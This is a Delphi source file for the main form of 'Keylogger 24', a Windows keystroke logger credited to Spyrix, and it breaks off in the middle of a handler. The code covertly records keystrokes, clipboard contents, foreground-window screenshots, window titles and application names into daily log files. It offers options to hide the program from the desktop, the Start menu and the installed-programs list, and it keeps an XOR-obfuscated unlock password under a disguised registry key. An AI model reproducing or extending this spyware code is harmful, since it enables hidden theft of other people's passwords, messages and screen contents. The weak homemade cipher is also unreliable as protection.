unit frmMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, ComCtrls, clipbrd, jpeg, ShellApi,
  spTrayIcon, DynamicSkinForm, SkinData, Menus, SkinMenus, SkinCtrls,
  SkinBoxCtrls, spCategoryButtons, SkinTabs, spcalendar, SkinGrids, ImgList,
  sppngimagelist, SkinHint, iniFiles, Registry, Mask, spMessages,
  SkinExCtrls, ShlObj;

type
  TForm1 = class(TForm)
    Button_start: TButton;
    Button_stop: TButton;
    Label1: TLabel;
    Memo_log: TMemo;
    Button_Update: TButton;
    Timer1: TTimer;
    Image1: TImage;
    spTrayIcon1: TspTrayIcon;
    spDynamicSkinForm1: TspDynamicSkinForm;
    Timer_scr: TTimer;
    spSkinPopupMenu1: TspSkinPopupMenu;
    spCompressedStoredSkin1: TspCompressedStoredSkin;
    spSkinData1: TspSkinData;
    Exit1: TMenuItem;
    spSkinGroupBox_LOG: TspSkinGroupBox;
    spSkinHeaderControl1: TspSkinHeaderControl;
    spSkinStringGrid1: TspSkinStringGrid;
    Timer_loadlog: TTimer;
    ViewLog1: TMenuItem;
    N1: TMenuItem;
    Hide1: TMenuItem;
    spSkinToolBar1: TspSkinToolBar;
    spSkinSpeedButton_Stop: TspSkinSpeedButton;
    spSkinSpeedButton_Start: TspSkinSpeedButton;
    spSkinSpeedButton_Exit: TspSkinSpeedButton;
    spPngImageList1: TspPngImageList;
    spSkinHint1: TspSkinHint;
    spSkinSpeedButton_Setting: TspSkinSpeedButton;
    Timer_Hint: TTimer;
    spSkinSpeedButton_About: TspSkinSpeedButton;
    spSkinSplitter1: TspSkinSplitter;
    spSkinPanel_BOTTOM: TspSkinPanel;
    spSkinGroupBox_DETAIL: TspSkinGroupBox;
    spSkinSpeedButton_Minimize: TspSkinSpeedButton;
    spSkinSpeedButton_Hide: TspSkinSpeedButton;
    spSkinNotebook1: TspSkinNotebook;
    spSkinMemo2: TspSkinMemo;
    Image_Trumb: TImage;
    spSkinMessage1: TspSkinMessage;
    spSkinToolBar_FIND: TspSkinToolBar;
    spSkinMenuSpeedButton_EVENT: TspSkinMenuSpeedButton;
    spPngImageList_EVENTS: TspPngImageList;
    spSkinPopupMenu_EVENTS: TspSkinPopupMenu;
    N11: TMenuItem;
    N21: TMenuItem;
    N31: TMenuItem;
    spSkinImagesMenu1: TspSkinImagesMenu;
    spSkinSpeedButton_TITLE: TspSkinSpeedButton;
    spSkinEdit_TITLE: TspSkinEdit;
    spSkinPanel_TIME: TspSkinPanel;
    spSkinEdit_APP: TspSkinEdit;
    spSkinEdit_VALUE: TspSkinEdit;
    spSkinScrollBar1: TspSkinScrollBar;
    spResourceStrData1: TspResourceStrData;
    spSkinDateEdit1: TspSkinDateEdit;
    spSkinDateEdit2: TspSkinDateEdit;
    Clipboard1: TMenuItem;
    spPngImageStorage1: TspPngImageStorage;
    ImageToday: TspPngImageView;
    spSkinSpeedButton_TITLEClear: TspSkinSpeedButton;
    spSkinSpeedButton_Home: TspSkinSpeedButton;
    spSkinSpeedButton_APP: TspSkinSpeedButton;
    spSkinSpeedButton_APPClear: TspSkinSpeedButton;
    spSkinSpeedButton_VALUE: TspSkinSpeedButton;
    spSkinSpeedButton_VALUEClear: TspSkinSpeedButton;
    spSkinDivider1: TspSkinDivider;
    spSkinDivider2: TspSkinDivider;
    spSkinDivider3: TspSkinDivider;
    procedure Button_startClick(Sender: TObject);
    procedure Button_stopClick(Sender: TObject);
    procedure Button_UpdateClick(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure spTrayIcon1DblClick(Sender: TObject);
    procedure Timer_scrTimer(Sender: TObject);
    procedure Exit1Click(Sender: TObject);
    procedure Timer_loadlogTimer(Sender: TObject);
    procedure spSkinMonthCalendar1Click(Sender: TObject);
    procedure spSkinStringGrid1Click(Sender: TObject);
    procedure Hide1Click(Sender: TObject);
    procedure Image_TrumbClick(Sender: TObject);
    procedure spSkinSpeedButton_ExitClick(Sender: TObject);
    procedure spSkinSpeedButton_SettingClick(Sender: TObject);
    procedure Timer_HintTimer(Sender: TObject);
    procedure spSkinSpeedButton_AboutClick(Sender: TObject);
    procedure spSkinHeaderControl1SectionResize(HeaderControl: THeaderControl;
      Section: THeaderSection);
    procedure spSkinStringGrid1DrawCell(Sender: TObject; ACol, ARow: Integer;
      Rect: TRect; State: TGridDrawState);
    procedure spSkinSpeedButton_MinimizeClick(Sender: TObject);
    procedure spSkinDateEdit1Enter(Sender: TObject);
    procedure spSkinSpeedButton_HideClick(Sender: TObject);
    procedure spSkinDateEdit1Change(Sender: TObject);
    procedure spSkinDateEdit2Change(Sender: TObject);
    procedure spSkinImagesMenu1Change(Sender: TObject);
    procedure spSkinEdit_APPKeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure spSkinEdit_TITLEKeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure spSkinEdit_VALUEKeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure spSkinSpeedButton_TITLEClick(Sender: TObject);
    procedure ImageTodayClick(Sender: TObject);
    procedure spSkinSpeedButton_TITLEClearClick(Sender: TObject);
    procedure spSkinSpeedButton_HomeClick(Sender: TObject);
    procedure spSkinSpeedButton_APPClick(Sender: TObject);
    procedure spSkinSpeedButton_VALUEClick(Sender: TObject);
    procedure spSkinSpeedButton_APPClearClick(Sender: TObject);
    procedure spSkinSpeedButton_VALUEClearClick(Sender: TObject);
    procedure N11Click(Sender: TObject);
    procedure N21Click(Sender: TObject);
    procedure N31Click(Sender: TObject);
    procedure Clipboard1Click(Sender: TObject);
  private
    { Private declarations }
     hLib2: THandle;
     DllStr1: string;
     FNextViewer:HWnd;
     procedure DllMessage(var Msg: TMessage); message WM_USER + 1678;
     procedure WMChain(var Msg: TWMChangeCBChain); message WM_CHANGECBCHAIN;
     procedure WMDrawClipboard(var Msg: TWMDrawClipboard);  message WM_DRAWCLIPBOARD;
     //procedure OnPaste(var Msg: TMessage); message WM_PASTE;
  public
    { Public declarations }
     FirstAppRun:bool;
     AppDataDir: string;
     procedure LoadLog(LogDate1, LogDate2:TDate);
     procedure SetLanguage(LngFile:string);     
     procedure SaveSettings;
     procedure LoadSettings;
     procedure WMHotKey(var Msg : TWMHotKey); message WM_HOTKEY;
  end;

type
 TStartHook = function(MemoHandle, AppHandle: HWND): Byte;
 TStopHook  = function: Boolean;

const
  StartKey = 19265;
  MultKey = 13765;
  AddKey = 23416;
  id_HotKey: integer = 101;

  MOD_ALT = 1;
  MOD_CONTROL = 2;
  MOD_SHIFT = 4;
  MOD_WIN = 8;

var
  Form1: TForm1;
  AppID, newID, App_scrID: string;
  StrBuff: string;
  scrFileName: string;
  EvertsCode: array[0..100000] of byte;
  ExeDir: string;
  AppDir: string;
  TestPS: string;
  LogFiltered:bool=False;
  CurrentLngFile: string = '';
  LoadInProc: bool = False;

  APP_NAME: string = 'Keylogger 24';
  APP_PARAM: string = '';
  APP_VERSION: string = '1.3';
  APP_COPYRIGHT: string = 'Copyright (c) Spyrix Inc.';
  APP_URL: string = 'www.spyrix.com';
  APP_MAIL: string = 'support@spyrix.com?subject="Keylogger%2024"';
  APP_VENDOR: string='Spyrix Inc.';

  function  Perevod(English: string):string;
  procedure GotoHomePage;
  procedure GotoMailLink;

implementation

uses winfuncs, Unit2, Unit3, Unit4;

{$R *.dfm}

procedure RunAsAdministrator(const source: string);
var
  shExecInfo: PSHELLEXECUTEINFOA;
begin
  New(shExecInfo);
  shExecInfo^.cbSize := sizeof(SHELLEXECUTEINFO);
  shExecInfo^.fMask := 0;
  shExecInfo^.Wnd := 0;
  shExecInfo^.lpVerb := 'runas';
  shExecInfo^.lpFile := PAnsiChar(ExtractFileName(source));
  shExecInfo^.lpParameters := PChar('"' + APP_NAME + '"');
  shExecInfo^.lpDirectory := PAnsiChar(ExtractFilePath(source));
  shExecInfo^.nShow := SW_SHOWNORMAL;
  shExecInfo^.hInstApp := 0;
  ShellExeCuteex(shExecInfo);
  Dispose(shExecInfo);
  shExecInfo := nil;
end;

function DateToFileName(dDate: TDate): string;
var sTime: string;
begin
 sTime:=DateToStr(dDate);
 sTime:=StringReplace(sTime, ':', '_', [rfReplaceAll]);
 sTime:=StringReplace(sTime, '\', '_', [rfReplaceAll]);
 sTime:=StringReplace(sTime, '/', '_', [rfReplaceAll]);
 DateToFileName:=sTime;
end;

procedure GotoHomePage;
begin
 ShellExecute(0, nil, Pchar(APP_URL + APP_PARAM), nil, nil, SW_SHOWNORMAL);
end;

procedure GotoMailLink;
begin
 ShellExecute(0, nil, PChar('mailto:' + APP_MAIL), nil, nil, SW_SHOWNORMAL)
end;


procedure TForm1.N11Click(Sender: TObject);
begin
 spSkinMenuSpeedButton_EVENT.ImageIndex:=-1;
 Timer_loadlog.Enabled:=True;
end;

procedure TForm1.N21Click(Sender: TObject);
begin
 spSkinMenuSpeedButton_EVENT.ImageIndex:=0;
 Timer_loadlog.Enabled:=True;
end;

procedure TForm1.N31Click(Sender: TObject);
begin
 spSkinMenuSpeedButton_EVENT.ImageIndex:=1;
 Timer_loadlog.Enabled:=True;
end;

function Perevod(English: string):string;
var sIniFile : TIniFile;
    lngFile  : string;
    EngVal, ReadVal  : string;
    Res      : string;
    p1       : integer;
begin
 lngFile:=ExeDir + 'lng/english.lng';
 sIniFile := TIniFile.Create(lngFile);
 EngVal:=sIniFile.ReadString('LngFile', English, '<Unknoun message>');
 sIniFile.Free;

 lngFile:= ExeDir + 'lng/' + CurrentLngFile;
 sIniFile := TIniFile.Create(lngFile);
 ReadVal:=sIniFile.ReadString('LngFile', English, EngVal);
 sIniFile.Free;
 Res:= ReadVal;

 while Pos('\a', Res) <> 0 do
  begin
   p1:=Pos('\a', Res);
   Delete(Res,p1,2);
   Insert('     ',Res,p1);
  end;

 while Pos('\n', Res) <> 0 do
  begin
   p1:=Pos('\n', Res);
   Delete(Res,p1,2);
   Insert(chr(10),Res,p1);
   Insert(chr(13),Res,p1);
  end;
  Res:=StringReplace(Res, '%app', APP_NAME, [rfReplaceAll]);
  Perevod:=Res;
end;
{-----------------------------------------------------------------------------}

procedure TForm1.SetLanguage(LngFile:string);
var r12, tr0: bool;
    r2, d2: string;
begin
 CurrentLngFile:=LngFile;
 // toolbar
 spSkinSpeedButton_Start.Caption:=Perevod('tbStart');
 spSkinSpeedButton_Start.Hint:=Perevod('tbStartHint');
 spSkinSpeedButton_Stop.Caption:=Perevod('tbStop');
 spSkinSpeedButton_Stop.Hint:=Perevod('tbStopHint');
 spSkinSpeedButton_Setting.Caption:=Perevod('tbSetting');
 spSkinSpeedButton_Setting.Hint:=Perevod('tbSettingHint');
 spSkinSpeedButton_About.Caption:=Perevod('tbAbout');
 spSkinSpeedButton_About.Hint:=Perevod('tbAboutHint');
 spSkinSpeedButton_Home.Caption:=Perevod('tbHomePage');
 spSkinSpeedButton_Home.Hint:=Perevod('tbHomePageHint');
 ImageToday.Hint:=Perevod('tbTodayHint');
 spSkinSpeedButton_Hide.Caption:=Perevod('tbHide');
 spSkinSpeedButton_Hide.Hint:=Perevod('tbHideHint');
 spSkinSpeedButton_Minimize.Caption:=Perevod('tbMinimize');
 spSkinSpeedButton_Minimize.Hint:=Perevod('tbMinimizeHint');
 spSkinSpeedButton_Exit.Caption:=Perevod('tbExit');
 spSkinSpeedButton_Exit.Hint:=Perevod('tbExitHint');
 ViewLog1.Caption:=Perevod('gbLog');
 Hide1.Caption:=Perevod('tbHide');
 Exit1.Caption:=Perevod('tbExit');
 // log
 spSkinGroupBox_LOG.Caption:=Perevod('gbLog');
 spSkinHeaderControl1.Sections[0].Text:=Perevod('tEvent');
 N11.Caption:=Perevod('tNoFilter');
 N21.Caption:=Perevod('tScreenShot');
 N31.Caption:=Perevod('tKeyboard');
 Clipboard1.Caption:=Perevod('tClipboard');
 spSkinHeaderControl1.Sections[1].Text:=Perevod('tDate');
 spSkinHeaderControl1.Sections[2].Text:=Perevod('tWinTitle');
 spSkinHeaderControl1.Sections[3].Text:=Perevod('tApplication');
 spSkinHeaderControl1.Sections[4].Text:=Perevod('tValue');
 spSkinSpeedButton_TITLE.Hint:= Perevod('tFind');
 spSkinSpeedButton_APP.Hint:=spSkinSpeedButton_TITLE.Hint;
 spSkinSpeedButton_Value.Hint:=spSkinSpeedButton_TITLE.Hint;
 spSkinSpeedButton_TITLEClear.Hint:=Perevod('tClearFilter');
 spSkinSpeedButton_APPClear.Hint:=spSkinSpeedButton_TITLEClear.Hint;
 spSkinSpeedButton_VALUEClear.Hint:=spSkinSpeedButton_TITLEClear.Hint;
 // detail
 spSkinGroupBox_DETAIL.Caption:=Perevod('gbDetail');
 // settings
 Form_Settings.Caption:=Perevod('tbSetting');
 Form_Settings.spSkinGroupBox_System.Caption:=Perevod('gbSystem');
 Form_Settings.spSkinCheckRadioBox_Run.Caption:=Perevod('stRun');
 Form_Settings.spSkinCheckRadioBox_Hide.Caption:=Perevod('stHide');
 Form_Settings.spSkinStdLabel_psw.Caption:=Perevod('stPassword1');
 Form_Settings.spSkinStdLabel_retry.Caption:=Perevod('stPassword2');
 Form_Settings.spSkinStdLabel_HK.Caption:=Perevod('stHotKey');
 Form_Settings.spSkinGroupBox_ScreenShot.Caption:=Perevod('gbScreenShot');
 Form_Settings.spSkinCheckRadioBox_winchange.Caption:=Perevod('stWinChange');
 Form_Settings.spSkinCheckRadioBox_clipchange.Caption:=Perevod('stClbChange');
 Form_Settings.spSkinGroupBox_Interface.Caption:=Perevod('gbInterface');
 Form_Settings.spSkinStdLabel_Language.Caption:=Perevod('stLanguage');
 Form_Settings.spSkinStdLabel_Skin.Caption:=Perevod('stSkin');
 Form_Settings.spSkinButton_Cancel.Caption:=Perevod('tCancel');
 //
 Form_Settings.spSkinCheckRadioBox_HideDS.Caption:=Perevod('tHideDS');
 Form_Settings.spSkinCheckRadioBox_HideSM.Caption:=Perevod('tHideSM');
 Form_Settings.spSkinCheckRadioBox_HideIP.Caption:=Perevod('tHideIP');
 //
 Form_pwd.Caption:=Perevod('tSecurity');
 Form_pwd.spSkinTextLabel_msg.Lines.Clear;
 Form_pwd.spSkinTextLabel_msg.Lines.Text:=Perevod('tSecurityMsg');
 Form_pwd.spSkinStdLabel_psw.Caption:=Perevod('tPassword');
 Form_pwd.spSkinButton_Cancel.Caption:=Perevod('tCancel');
 //
 Form_About.Caption:=Perevod('tbAbout') + ' ' + APP_NAME;
 Form_About.spSkinButton_Close.Caption:=Perevod('tClose');
 Form_About.Label_Version.Caption:= Perevod('tVersion') + ' ' + APP_VERSION;
 Form_About.LinkLabel_URL.Caption:=Perevod('tDownload');
 Form_About.Registered_Label.Caption:=Perevod('tFree');
 //
end;


procedure TForm1.WMHotKey (var Msg : TWMHotKey);
begin
if Msg.HotKey = id_HotKey then
 begin
   if Form1.Visible then exit;
   if spTrayIcon1.IconVisible then exit;
   Form_pwd.spSkinPasswordEdit.Text:='';
   if Form_pwd.ShowModal = mrOK then
    begin
     if Form_pwd.spSkinPasswordEdit.Text = TestPS then
      begin
       TestPS:='';
       Form1.Visible:=True;
       Timer_loadlog.Enabled:=True;
      end
     else spSkinMessage1.MessageDlg(Perevod('Msg1'), mtError, [mbOK] , 0); // Пароль не верен!
    end;
 end;
end;


function EncryptStr(const InString: string; StartKey, MultKey, AddKey: Integer):string;
var
  I: Byte;
begin
  Result := '';
  for I := 1 to Length(InString) do
  begin
    Result := Result + CHAR(Byte(InString[I]) xor (StartKey shr 8));
    StartKey := (Byte(Result[I]) + StartKey) * MultKey + AddKey;
  end;
end;

function DecryptStr(const InString: string; StartKey, MultKey, AddKey: Integer):string;
var
  I: Byte;
begin
  Result := '';
  for I := 1 to Length(InString) do
  begin
    Result := Result + CHAR(Byte(InString[I]) xor (StartKey shr 8));
    StartKey := (Byte(InString[I]) + StartKey) * MultKey + AddKey;
  end;
end;

function Get_Item(S:string; p: integer):string;
var p1, p2: integer;
         i: integer;
begin
 p1:=Pos(';;', S);
 while (p1 > 0) do
  begin
   S:= Copy(S, 1, p1 - 1) + '; ;' + Copy(S, p1 + 2, 255);
   P1:=Pos(';;', S);
  end;

 p1:=1;
 for i := 1 to p do
  begin
   p1:=Pos(';', S);
   if p1>0 then S[p1]:=' ';
  end;
  p2:=Pos(';', S);
  if p2>0 then get_item:=Copy(S, p1+1, p2-p1-1) else get_item:='???';
end;


function DelBadChars(S: string): string;
var Pos1: integer;
    enterChars: string;
begin
if S = '' then
 begin
  DelBadChars:='';
  exit;
 end;
 //
 enterChars:=chr(13) + chr(10);
 Pos1:=Pos(enterChars, S);
 while (Pos1 > 0) do
  begin
   S[Pos1]:='/'; S[Pos1+1]:='n';
   Pos1:=Pos(enterChars, S);
  end;

 enterChars:='chr(13)';
 Pos1:=Pos(enterChars, S);
 while (Pos1 > 0) do
  begin
   S:= Copy(S, 1, Pos1 - 1) + '/n' + Copy(S, Pos1 + 1, 255);
   Pos1:=Pos(enterChars, S);
  end;

 enterChars:='chr(10)';
 Pos1:=Pos(enterChars, S);
 while (Pos1 > 0) do
  begin
   S:= Copy(S, 1, Pos1 - 1) + '/n' + Copy(S, Pos1 + 1, 255);
   Pos1:=Pos(enterChars, S);
  end;

 enterChars:=';';
 Pos1:=Pos(enterChars, S);
 while (Pos1 > 0) do
  begin
   S:= Copy(S, 1, Pos1 - 1) + '/s' + Copy(S, Pos1 + 1, 255);
   Pos1:=Pos(enterChars, S);
  end;

 DelBadChars:=S;
end;


function RestoreBadChars(S: string): string;
var Pos1: integer;
    enterChars: string;
begin
if S = '' then
 begin
  RestoreBadChars:='';
  exit;
 end;
 enterChars:='/n';
 Pos1:=Pos(enterChars, S);
 while (Pos1 > 0) do
  begin
   S[Pos1]:=chr(13); S[Pos1+1]:=chr(10);
   Pos1:=Pos(enterChars, S);
  end;

 enterChars:='/s';
 Pos1:=Pos(enterChars, S);
 while (Pos1 > 0) do
  begin
   S[Pos1]:=';'; Delete(S, Pos1+1, 1);
   Pos1:=Pos(enterChars, S);
  end;

 RestoreBadChars:=S;
end;

procedure UpdateID;
var aWin: HWND;
begin
  aWin:=GetForegroundWindow;
  newID:=DelBadChars(GetWinCaption(aWin)) + ';' + DelBadChars(GetExeNameByProcID(GetForegroundWindow));
end;


procedure Save2Log(S: string);
var tFile: Text;
    sFileName: string;
begin
 if Trim(S)='' then exit; if Trim(S)='"' then exit;
 try
  sFileName:=Form1.AppDataDir + 'logs\' + DateToFileName(Now) + '.log';
  AssignFile(tFile, sFileName);
  if not FileExists(sFileName) then Rewrite(tFile) else Append(tFile);
  Writeln(tFile, S);
  CloseFile(tFile);
 except end;

end;


procedure ScreenShotActiveWindow(Bild: TBitMap);
 var
   c: TCanvas;
   r, t: TRect;
   h: THandle;
 begin
   c := TCanvas.Create;
   c.Handle := GetWindowDC(GetDesktopWindow);
   h := GetForeGroundWindow;
   if h <> 0 then
     GetWindowRect(h, t);
   try
     r := Rect(0, 0, t.Right - t.Left, t.Bottom - t.Top);
     Bild.Width  := t.Right - t.Left;
     Bild.Height := t.Bottom - t.Top;
     Bild.Canvas.CopyRect(r, c, t);
   finally
     ReleaseDC(0, c.Handle);
     c.Free;
   end;
 end;

procedure TForm1.SaveSettings;
var iniFile: TIniFile;
    sFileName: string;
    reg: TRegistry;
begin
 sFileName:=AppDataDir + 'temp\logger.ini';
 iniFile:= TIniFile.Create(sFileName);
 // window pos
 iniFile.WriteInteger('Window', 'Top', Form1.Top);
 iniFile.WriteInteger('Window', 'Left', Form1.Left);
 iniFile.WriteInteger('Window', 'Width', Form1.Width);
 iniFile.WriteInteger('Window', 'Height', Form1.Height);
 iniFile.WriteInteger('Window', 'BottomHeight', spSkinPanel_BOTTOM.Height);
 iniFile.WriteInteger('Window', 'Col1', spSkinStringGrid1.ColWidths[0]);
 iniFile.WriteInteger('Window', 'Col2', spSkinStringGrid1.ColWidths[1]);
 iniFile.WriteInteger('Window', 'Col3', spSkinStringGrid1.ColWidths[2]);
 iniFile.WriteInteger('Window', 'Col4', spSkinStringGrid1.ColWidths[3]);
 iniFile.WriteInteger('Window', 'Col5', spSkinStringGrid1.ColWidths[4]);
 // settings
 iniFile.WriteBool('System', 'autorun', Form_Settings.spSkinCheckRadioBox_Run.Checked);
 iniFile.WriteBool('System', 'hide', Form_Settings.spSkinCheckRadioBox_Hide.Checked);
 iniFile.WriteInteger('System', 'hotkeyid', Form_Settings.spSkinComboBox_HK.ItemIndex);
 iniFile.WriteBool('ScreenShot', 'atWinChange', Form_Settings.spSkinCheckRadioBox_winchange.Checked);
 iniFile.WriteBool('ScreenShot', 'atClbChange', Form_Settings.spSkinCheckRadioBox_clipchange.Checked);
 iniFile.WriteString('Interface', 'skinfile', Form_Settings.spSkinComboBox_SKIN.Text);
 iniFile.WriteString('Interface', 'lngfile', Form_Settings.spSkinComboBox_LNG.Text);
 iniFile.WriteBool('System', 'Run1', False);
 iniFile.Free;
end;

procedure TForm1.LoadSettings;
var iniFile: TIniFile;
    sFileName, s_item: string;
    reg: TRegistry;
begin
 sFileName:=AppDataDir + 'temp\logger.ini';
 iniFile:= TIniFile.Create(sFileName);
 Form1.Top:= iniFile.ReadInteger('Window', 'Top', Form1.Top);
 Form1.Left:= iniFile.ReadInteger('Window', 'Left', Form1.Left);
 Form1.Width:= iniFile.ReadInteger('Window', 'Width', Width);
 Form1.Height:= iniFile.ReadInteger('Window', 'Height', Height);
 spSkinPanel_BOTTOM.Height:= iniFile.ReadInteger('Window', 'BottomHeight', spSkinPanel_BOTTOM.Height);
 spSkinHeaderControl1.Sections[0].Width:= iniFile.ReadInteger('Window', 'Col1', spSkinStringGrid1.ColWidths[0]+1)+1;
 spSkinHeaderControl1.Sections[1].Width:= iniFile.ReadInteger('Window', 'Col2', spSkinStringGrid1.ColWidths[1]+1)+1;
 spSkinHeaderControl1.Sections[2].Width:= iniFile.ReadInteger('Window', 'Col3', spSkinStringGrid1.ColWidths[2]+1)+1;
 spSkinHeaderControl1.Sections[3].Width:= iniFile.ReadInteger('Window', 'Col4', spSkinStringGrid1.ColWidths[3]+1)+1;
 spSkinHeaderControl1.Sections[4].Width:= iniFile.ReadInteger('Window', 'Col5', spSkinStringGrid1.ColWidths[4]+1)+1;
 spSkinStringGrid1.ColWidths[0]:=spSkinHeaderControl1.Sections[0].Width - 1;
 spSkinStringGrid1.ColWidths[1]:=spSkinHeaderControl1.Sections[1].Width - 1;
 spSkinStringGrid1.ColWidths[2]:=spSkinHeaderControl1.Sections[2].Width - 1;
 spSkinStringGrid1.ColWidths[3]:=spSkinHeaderControl1.Sections[3].Width - 1;
 spSkinStringGrid1.ColWidths[4]:=spSkinHeaderControl1.Sections[4].Width - 1;
 spSkinHeaderControl1SectionResize(spSkinHeaderControl1, spSkinHeaderControl1.Sections[0]);
 spSkinHeaderControl1SectionResize(spSkinHeaderControl1, spSkinHeaderControl1.Sections[1]);
 spSkinHeaderControl1SectionResize(spSkinHeaderControl1, spSkinHeaderControl1.Sections[2]);
 spSkinHeaderControl1SectionResize(spSkinHeaderControl1, spSkinHeaderControl1.Sections[3]);
 spSkinHeaderControl1SectionResize(spSkinHeaderControl1, spSkinHeaderControl1.Sections[4]);
 FirstAppRun:=iniFile.ReadBool('System', 'Run1', True);
  // settings
 Form_Settings.spSkinCheckRadioBox_Hide.Checked:=iniFile.ReadBool('System', 'hide', False);
 Form_Settings.spSkinComboBox_HK.ItemIndex:=iniFile.ReadInteger('System', 'hotkeyid', 0);
 Form_Settings.spSkinCheckRadioBox_winchange.Checked:=iniFile.ReadBool('ScreenShot', 'atWinChange', True);
 Form_Settings.spSkinCheckRadioBox_clipchange.Checked:=iniFile.ReadBool('ScreenShot', 'atClbChange', True);
 s_item:=iniFile.ReadString('Interface', 'lngfile', 'english.lng');
 Form_Settings.spSkinComboBox_LNG.ItemIndex:=Form_Settings.spSkinComboBox_LNG.Items.IndexOf(s_item);
 s_item:=iniFile.ReadString('Interface', 'skinfile', 'Default.skn');
 Form_Settings.spSkinComboBox_SKIN.ItemIndex:=Form_Settings.spSkinComboBox_SKIN.Items.IndexOf(s_item);
 iniFile.Free;
 //
 reg := TRegistry.Create;
 reg.LazyWrite := false;
 reg.RootKey := HKEY_LOCAL_MACHINE;
 try
  reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\LocalSysData',true);
  TestPS:=reg.ReadString('rtsysA0FCC89A');
  TestPS:=DecryptStr(TestPS, StartKey, MultKey, AddKey);
  Form_Settings.spSkinPasswordEdit.Text:=TestPS;
  Form_Settings.spSkinPasswordEdit_retry.Text:=TestPS;
  reg.CloseKey;
  reg.Free;
  if TestPS = '' then Form_Settings.spSkinCheckRadioBox_Hide.Checked:= False;
  SetLanguage(Form_Settings.spSkinComboBox_LNG.Text);
  Form1.spSkinData1.LoadFromCompressedFile(ExeDir+ 'skins/'+ Form_Settings.spSkinComboBox_SKIN.Text);
  Form_Settings.spSkinButton_OkClick(nil);
 except end;
end;


procedure TForm1.LoadLog(LogDate1, LogDate2: TDate);
var tFile: TextFile;
    sFileName: string;
    SLine, sEvent: string;
    isData: bool;
    iDate, iDate1, iDate2: Word;
    t_TITLE, t_APP, t_VALUE: string;
    Log1, Log2, Log3, Log4: bool;
begin
 if LoadInProc then exit;
 LoadInProc:=True;

 isData:=False;
 iDate1:=Trunc(LogDate1);
 iDate2:=Trunc(LogDate2);
 spSkinStringGrid1.RowCount:=1;
 Application.ProcessMessages;
 spSkinStringGrid1.OnClick:=nil;
 spSkinStringGrid1.Visible:=False;

 for iDate:=iDate1 to iDate2 do
 try
  sFileName:=AppDataDir + 'logs\' + DateToFileName(iDate) + '.log';
  if FileExists(sFileName) then
   begin
    AssignFile(tFile, sFileName);
    Reset(tFile);
     while not EOF(tFile) do
      begin
       Readln(tFile, SLine);
       SLine:=';' + SLine + ';';
       //
       sEvent:=Get_Item(SLine, 1);
       t_TITLE:=Get_Item(SLine, 3);
       t_APP:=Get_Item(SLine, 4);
       t_VALUE:=Get_Item(SLine, 5);
       //
       Log1:=(spSkinMenuSpeedButton_EVENT.ImageIndex = 0) and (sEvent='SCREENSHOT')
           or(spSkinMenuSpeedButton_EVENT.ImageIndex = 1) and (sEvent='KEYBOARD')
           or(spSkinMenuSpeedButton_EVENT.ImageIndex = 2) and (sEvent='CLIPBOARD_SET')
           or(spSkinMenuSpeedButton_EVENT.ImageIndex = -1);

       Log2:= (spSkinEdit_TITLE.Text = '') or (Pos(AnsiUpperCase(spSkinEdit_TITLE.Text), AnsiUpperCase(t_TITLE)) > 0);
       Log3:= (spSkinEdit_APP.Text = '') or (Pos(AnsiUpperCase(spSkinEdit_APP.Text), AnsiUpperCase(t_APP)) > 0);
       Log4:= (spSkinEdit_VALUE.Text = '') or (Pos(AnsiUpperCase(spSkinEdit_VALUE.Text), AnsiUpperCase(t_VALUE)) > 0);

       if Log1 and Log2 and Log3 and Log4 then
       begin

        isData:=True;
        spSkinStringGrid1.Cells[0, spSkinStringGrid1.RowCount-1]:='';
        if sEvent = 'KEYBOARD' then EvertsCode[spSkinStringGrid1.RowCount-1]:= 1;
        if sEvent = 'CLIPBOARD_SET' then EvertsCode[spSkinStringGrid1.RowCount-1]:= 2;
        if sEvent = 'CLIPBOARD_VALUE' then EvertsCode[spSkinStringGrid1.RowCount-1]:= 3;
        if sEvent = 'SCREENSHOT' then EvertsCode[spSkinStringGrid1.RowCount-1]:= 4;
        spSkinStringGrid1.Cells[1, spSkinStringGrid1.RowCount-1]:=Get_Item(SLine, 2);
        spSkinStringGrid1.Cells[2, spSkinStringGrid1.RowCount-1]:=t_TITLE;
        spSkinStringGrid1.Cells[3, spSkinStringGrid1.RowCount-1]:=t_APP;
        spSkinStringGrid1.Cells[4, spSkinStringGrid1.RowCount-1]:=t_VALUE;
        spSkinStringGrid1.RowCount:=spSkinStringGrid1.RowCount + 1;
       end;
       Application.ProcessMessages;
      end;
       spSkinStringGrid1.RowCount:=spSkinStringGrid1.RowCount - 1;
       spSkinStringGrid1.Row:=spSkinStringGrid1.RowCount - 1;
    CloseFile(tFile);
   end
 except end;

if not isData then
 begin
  spSkinStringGrid1.RowCount:=1;
  spSkinStringGrid1.Rows[0].Clear;
 end;
 LoadInProc:=False;
 spSkinStringGrid1.Visible:=True;
 spSkinStringGrid1.OnClick:=spSkinStringGrid1Click;
 spSkinStringGrid1Click(nil);
end;


procedure TForm1.ImageTodayClick(Sender: TObject);
begin
 spSkinDateEdit1.Date:=Now;
 spSkinDateEdit2.Date:=Now;
 Timer_loadlog.Enabled:=True;
end;

procedure TForm1.spSkinDateEdit1Change(Sender: TObject);
begin
 if spSkinDateEdit1.Date > spSkinDateEdit2.Date then spSkinDateEdit2.Date:=spSkinDateEdit1.Date;
 Timer_loadlog.Enabled:=True;
end;

procedure TForm1.spSkinDateEdit1Enter(Sender: TObject);
begin
 spSkinStringGrid1.SetFocus;
end;

procedure TForm1.spSkinDateEdit2Change(Sender: TObject);
begin
 if spSkinDateEdit2.Date < spSkinDateEdit1.Date then spSkinDateEdit1.Date:=spSkinDateEdit2.Date;
 Timer_loadlog.Enabled:=True;
end;

procedure TForm1.spSkinEdit_APPKeyUp(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
 if Key = 13 then Timer_loadlog.Enabled:=True;
 if spSkinEdit_APP.Text='' then Timer_loadlog.Enabled:=True;
end;

procedure TForm1.spSkinEdit_TITLEKeyUp(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
 if Key = 13 then Timer_loadlog.Enabled:=True;
